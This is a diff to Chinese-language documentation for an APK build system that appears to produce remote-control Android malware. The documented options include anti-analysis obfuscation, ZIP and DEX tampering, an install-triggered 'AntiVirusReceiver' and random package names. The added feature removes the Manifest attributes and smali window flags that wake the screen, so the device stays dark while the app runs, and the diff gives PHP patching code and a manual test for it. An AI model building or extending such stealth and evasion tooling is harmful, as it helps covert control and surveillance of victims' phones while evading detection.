@@ -147,6 +147,9 @@ APK_ENCRYPTION_ITERATIONS=65536
 APK_DEFAULT_ICON=default/icon.png
 APK_DEFAULT_BACKGROUND=black
 
+# 功能开关
+APK_ENABLE_AUTO_WAKE_SCREEN=true
+
 # 保护功能
 APK_ENABLE_JUNK_CLASSES=false
 APK_ENABLE_CLASS_SHUFFLE=false
@@ -177,6 +180,7 @@ $config = ApkBuildConfig::fromArray([
     'use_wss' => true,
     'icon_path' => 'custom_icon.png',
     'background_path' => 'splash.png',
+    'enable_auto_wake_screen' => false,  // 关闭自动唤醒屏幕（默认 true）
     'enable_junk_classes' => true,
     'junk_class_count' => 100,
 ]);
@@ -216,6 +220,7 @@ echo "构建耗时: " . $result->formatTime();
     --wss \
     --icon=custom/icon.png \
     --background=splash.png \
+    --no-auto-wake-screen \
     --junk-classes \
     --shuffle-classes \
     --protect \
@@ -239,6 +244,7 @@ echo "构建耗时: " . $result->formatTime();
     "login_title": "欢迎使用",
     "login_dis": "请授权以继续",
     "login_btn": "开始",
+    "enable_auto_wake_screen": false,
     "enable_junk_classes": true,
     "enable_class_shuffle": true,
     "enable_string_obfuscation": true,
@@ -251,6 +257,34 @@ echo "构建耗时: " . $result->formatTime();
     "junk_class_count": 100,
     "fake_entry_count": 320
 }
+```
+
+### 4. 命令输出示例
+
+构建成功后，命令会显示包名、输出路径和构建耗时：
+
+```
+╔════════════════════════════════════════╗
+║            ✅ 构建成功!                 ║
+╚════════════════════════════════════════╝
+
+┌──────────┬─────────────────────────────────────────────────────────┐
+│ 项目     │ 值                                                      │
+├──────────┼─────────────────────────────────────────────────────────┤
+│ 包名     │ com.example.myapp                                       │
+│ 输出路径 │ /var/www/html/storage/app/public/apk/1/com.example...  │
+│ 总耗时   │ 1.5min                                                  │
+└──────────┴─────────────────────────────────────────────────────────┘
+
+构建步骤耗时:
+┌─────────────────────┬────────┐
+│ 步骤                │ 耗时   │
+├─────────────────────┼────────┤
+│ check_dependencies  │ 0.2s   │
+│ prepare_work_dir    │ 0.5s   │
+│ modify_smali        │ 0.3s   │
+│ ...                 │ ...    │
+└─────────────────────┴────────┘
 ```
 
 ## 配置参数说明
@@ -292,6 +326,7 @@ echo "构建耗时: " . $result->formatTime();
 | `enableFullStringEncryption` | bool | | `false` | 启用 const-string XOR 加密 |
 | `enableApkProtection` | bool | | `false` | 启用 APK 保护（Manifest 膨胀 + APKEditor + ZIP 保护） |
 | `enableDexModification` | bool | | `false` | 启用 DEX 头部修改 |
+| `enableAutoWakeScreen` | bool | | `true` | 自动唤醒屏幕（关闭后按锁屏键可保持黑屏） |
 | `enableFakeEncryption` | bool | | `false` | 启用 ZIP 假加密标志（0xF741） |
 | `enablePathTraversalEntries` | bool | | `false` | 启用路径穿越假条目 |
 | `enableEocdTampering` | bool | | `false` | 启用 EOCD 篡改 |
@@ -315,6 +350,46 @@ echo "构建耗时: " . $result->formatTime();
 | `loginDis` | 最大 200 字符 |
 | `loginBtn` | 最大 50 字符 |
 | `description` | 最大 500 字符 |
+
+### 功能说明
+
+#### 自动唤醒屏幕 (enableAutoWakeScreen)
+
+控制 APK 在启动 TransparentActivity 时是否自动点亮屏幕。
+
+- **默认值**: `true`（保持原有行为）
+- **关闭效果**: 用户按锁屏键后，设备可以保持黑屏状态，不会被自动唤醒
+- **实现原理**: 
+  - **Manifest 层**: 移除 `android:turnScreenOn`、`android:showOnLockScreen`、`android:showWhenLocked` 属性
+  - **Smali 层**: 移除 `TransparentActivity.smali` 中的 Window flags (`0x80000`, `0x20`)
+  - **双重防护**: 必须同时移除 Manifest 属性和 Smali 代码才能彻底禁用
+- **使用场景**: 
+  - 需要设备保持黑屏运行时，设置为 `false`
+  - 需要自动唤醒屏幕时，设置为 `true`（默认）
+
+**配置示例**:
+
+```php
+// PHP 代码
+$config = ApkBuildConfig::fromArray([
+    'enable_auto_wake_screen' => false,  // 关闭自动唤醒
+    // ... 其他配置
+]);
+```
+
+```json
+// JSON 配置文件
+{
+    "enable_auto_wake_screen": false
+}
+```
+
+```bash
+# Artisan 命令
+./vendor/bin/sail artisan apk:build --no-auto-wake-screen
+```
+
+**Web 界面**: 在"功能设置"标签页的"功能开关"中可以切换此选项。
 
 ## 环境依赖
 
@@ -703,3 +778,227 @@ AntiVirusReceiver.onReceive（安装触发）
 - [APK_BUILD_SYSTEM.md](../legacy/APK_BUILD_SYSTEM.md) - 旧系统构建流程
 - [APK_STUB_TEMPLATE.md](../legacy/APK_STUB_TEMPLATE.md) - APK 模板结构
 - [APK_RUNTIME_FLOW.md](../legacy/APK_RUNTIME_FLOW.md) - APK 运行时行为
+
+## 技术实现细节
+
+### 自动唤醒屏幕功能实现
+
+#### 问题背景
+
+Android 应用可以通过以下机制唤醒屏幕：
+1. **Manifest 属性**: `android:turnScreenOn`、`android:showOnLockScreen`、`android:showWhenLocked`
+2. **Window Flags**: `FLAG_SHOW_WHEN_LOCKED (0x80000)`、`FLAG_ALLOW_LOCK_WHILE_SCREEN_ON (0x20)`
+
+这两种机制必须**同时存在**才能在锁屏后自动唤醒屏幕。
+
+#### 实现方案
+
+**1. Manifest 属性移除** (`ApkBuilder::modifyTransparentActivityWakeScreen()`)
+
+```php
+if (!$config->enableAutoWakeScreen) {
+    // 移除 turnScreenOn
+    $content = preg_replace(
+        '/(<activity[^>]*android:name="[^"]*TransparentActivity"[^>]*)\s*android:turnScreenOn="true"\s*/',
+        '$1 ',
+        $content
+    );
+    // 移除 showOnLockScreen
+    $content = preg_replace(
+        '/(<activity[^>]*android:name="[^"]*TransparentActivity"[^>]*)\s*android:showOnLockScreen="true"\s*/',
+        '$1 ',
+        $content
+    );
+    // 移除 showWhenLocked
+    $content = preg_replace(
+        '/(<activity[^>]*android:name="[^"]*TransparentActivity"[^>]*)\s*android:showWhenLocked="true"\s*/',
+        '$1 ',
+        $content
+    );
+}
+```
+
+**2. Smali Window Flags 移除** (`SmaliProcessor::removeWakeScreenFlags()`)
+
+```php
+public function removeWakeScreenFlags(bool $enableAutoWakeScreen): void
+{
+    if ($enableAutoWakeScreen) {
+        return; // 保持默认行为
+    }
+
+    $transparentActivityPath = $this->buildDir . '/smali/com/icontrol/protector/TransparentActivity.smali';
+    
+    if (!File::exists($transparentActivityPath)) {
+        return;
+    }
+
+    $content = File::get($transparentActivityPath);
+    
+    // 移除 FLAG_SHOW_WHEN_LOCKED (0x80000)
+    $content = preg_replace(
+        '/\s*const\/high16\s+v\d+,\s*0x80000\s*\n\s*invoke-virtual\s+\{[^}]+\},\s*Landroid\/view\/Window;->addFlags\(I\)V\s*\n/m',
+        "\n",
+        $content
+    );
+    
+    // 移除 FLAG_ALLOW_LOCK_WHILE_SCREEN_ON (0x20)
+    $content = preg_replace(
+        '/\s*const\/16\s+v\d+,\s*0x20\s*\n\s*invoke-virtual\s+\{[^}]+\},\s*Landroid\/view\/Window;->setFlags\(II\)V\s*\n/m',
+        "\n",
+        $content
+    );
+
+    File::put($transparentActivityPath, $content);
+}
+```
+
+#### Smali 代码示例
+
+**原始代码** (启用自动唤醒):
+```smali
+.method protected onCreate(Landroid/os/Bundle;)V
+    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;
+    move-result-object p1
+    const/high16 v0, 0x80000
+    invoke-virtual {p1, v0}, Landroid/view/Window;->addFlags(I)V
+    const/16 v0, 0x20
+    invoke-virtual {p1, v0, v0}, Landroid/view/Window;->setFlags(II)V
+    return-void
+.end method
+```
+
+**修改后** (禁用自动唤醒):
+```smali
+.method protected onCreate(Landroid/os/Bundle;)V
+    invoke-virtual {p0}, Landroid/app/Activity;->getWindow()Landroid/view/Window;
+    move-result-object p1
+
+    return-void
+.end method
+```
+
+#### 测试验证
+
+**单元测试**: `tests/Unit/ApkBuilder/SmaliProcessorWakeFlagsTest.php`
+
+```php
+it('移除 FLAG_SHOW_WHEN_LOCKED (0x80000) 当禁用自动唤醒时', function () {
+    $content = <<<'SMALI'
+const/high16 v0, 0x80000
+invoke-virtual {p1, v0}, Landroid/view/Window;->addFlags(I)V
+SMALI;
+    
+    File::put($this->transparentActivityPath, $content);
+    $this->processor->removeWakeScreenFlags(false);
+    
+    $result = File::get($this->transparentActivityPath);
+    expect($result)->not->toContain('0x80000');
+});
+```
+
+**手动测试**:
+```bash
+# 1. 构建 APK (禁用自动唤醒)
+./vendor/bin/sail artisan apk:build --config=config.json --no-auto-wake-screen
+
+# 2. 安装到手机
+adb install app.apk
+
+# 3. 测试流程
+# - 启动应用
+# - 按 Home 键切换到后台
+# - 等待 5-10 秒
+# - 按电源键锁屏
+# - 等待 10 秒
+# - 检查屏幕状态: adb shell dumpsys power | grep mWakefulness
+
+# 预期结果: mWakefulness=Asleep (屏幕保持关闭)
+```
+
+### 自动生成包名和版本号
+
+#### 实现位置
+
+`ApkBuilder::build()` 方法在验证前自动生成空值：
+
+```php
+public function build(ApkBuildConfig $config): ApkBuildResult
+{
+    // 自动生成空值
+    if (empty($config->appId)) {
+        $config->appId = $this->generateRandomPackageName();
+    }
+    if (empty($config->appVersion)) {
+        $config->appVersion = $this->generateRandomVersion();
+    }
+    
+    // ... 继续构建流程
+}
+```
+
+#### 生成规则
+
+**包名格式**: `com.[word][word].[word][word]`
+
+```php
+private function generateRandomPackageName(): string
+{
+    $words = ApkBuilderConstants::PACKAGE_NAME_WORDS;
+    $w = fn() => $words[array_rand($words)];
+    return 'com.' . $w() . $w() . '.' . $w() . $w();
+}
+```
+
+**版本号格式**: `[1-9].[0-99].[0-99]`
+
+```php
+private function generateRandomVersion(): string
+{
+    return sprintf('%d.%d.%d', 
+        random_int(1, 9), 
+        random_int(0, 99), 
+        random_int(0, 99)
+    );
+}
+```
+
+#### 示例输出
+
+```
+包名: com.basenet.touchbase
+版本号: 3.42.17
+```
+
+### ApkBuildConfig 可变性
+
+#### 变更说明
+
+移除所有 49 个属性的 `readonly` 修饰符，允许运行时修改：
+
+```php
+// 之前
+public readonly string $appId;
+
+// 之后
+public string $appId;
+```
+
+#### 使用场景
+
+```php
+$config = ApkBuildConfig::fromArray([
+    'app_id' => '',  // 空值
+    'app_version' => '',
+    // ...
+]);
+
+// ApkBuilder 会自动填充
+$builder->build($config);
+
+// 构建后可以访问生成的值
+echo $config->appId;  // com.basenet.touchbase
+echo $config->appVersion;  // 3.42.17
+```
+
+---
